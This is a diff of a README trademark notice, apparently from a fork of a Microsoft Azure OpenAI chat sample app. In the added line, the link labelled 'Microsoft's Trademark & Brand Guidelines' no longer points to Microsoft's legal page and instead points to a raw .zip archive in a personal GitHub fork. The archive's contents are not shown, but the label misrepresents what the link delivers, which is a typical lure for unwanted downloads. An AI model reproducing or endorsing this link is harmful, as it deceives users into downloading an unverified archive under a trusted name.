 This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft 
 trademarks or logos is subject to and must follow 
-[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
+[Microsoft's Trademark & Brand Guidelines](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip).
 Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
 Any use of third-party trademarks or logos are subject to those third-party's policies.
